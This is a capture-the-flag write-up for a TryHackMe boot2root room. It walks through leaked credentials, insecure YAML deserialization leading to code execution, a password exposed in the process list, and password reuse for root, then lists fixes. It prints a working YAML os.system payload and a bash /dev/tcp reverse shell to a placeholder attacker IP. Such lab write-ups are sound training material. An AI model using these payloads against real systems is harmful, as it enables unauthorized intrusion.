# Beach Bar

**Platform:** TryHackMe (Hacker Holidays) · **Difficulty:** Easy · **Date:** 2026-08-01
**Tags:** Web, Insecure Deserialization, Reverse Shell, Privilege Escalation, Credential Reuse

## The target

A "Beach Bar" web app with a DJ-booth sign-in that manages jukebox playlists.
Goal: user flag, then root flag (boot2root).

## Recon

- `nmap -sC -sV -p-` found two ports: **22/SSH** (OpenSSH, key-only auth, so no
  password login, a dead end) and **80/HTTP** (the web app).
- Viewed the login page source (`Ctrl+U`) and found a developer's HTML comment
  leaking **demo credentials `dj / dj`** ("swap this before the season starts").
- `gobuster` found `/dashboard`, `/import`, `/export` (all `302` redirects, so
  they need authentication) and `/login` (`200`).

## Foothold: insecure YAML deserialization

- Logged in with `dj / dj`. The dashboard lets you **export** and **import**
  playlists as YAML.
- The import parses uploaded YAML server-side (a Flask/gunicorn Python app). If
  the parser is unsafe, a crafted YAML tag makes it run code:
  `!!python/object/apply:os.system ["<command>"]`.
- **Confirmed RCE first with a harmless command.** Sent a `ping` payload and
  watched for it with tcpdump:
  ```
  !!python/object/apply:os.system ["ping -c 3 <ATTACKER_IP>"]
  ```
  The target pinged my AttackBox (visible in `tcpdump -i any icmp`), and the app
  returned the command's exit code. Code execution proven.
- Upgraded to a shell. Started a listener (`nc -lvnp 4444`) and sent a reverse
  shell payload:
  ```
  !!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"]
  ```
  Caught a shell as the user **bartender**, then stabilised it with
  `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
- The **user flag** was in the `bartender` user's home directory.

## Privilege escalation: secrets in the process list

- Enumerated running processes:
  ```
  ps aux | grep -i juke
  ```
  A **jukeboxd** service was running **as root**, and its command line exposed a
  password as an argument (`--stream-pass <password>`). `ps` shows full command
  lines to every user, so any local user could read it.
- Tried **password reuse**: `su root` with that password. It worked, because
  root reused it as its own login password.
- The **root flag** was in root's home directory. Fittingly, it spelled out the
  lesson: `THM.....` (credential reuse).

## Finding & fix

**Findings:**
- **Insecure deserialization** on the import feature: the app parsed untrusted
  YAML with an unsafe loader, allowing remote code execution.
- **Secrets in the process list**: a root service took a password as a
  command-line argument, exposing it to any local user via `ps`.
- **Password reuse**: that same password was root's login password.

**Fixes:**
- Parse untrusted YAML with `yaml.safe_load`, never an unsafe loader.
- Never pass secrets as command-line arguments; use environment variables or a
  permission-restricted config file.
- Never reuse credentials across a service and a user account.
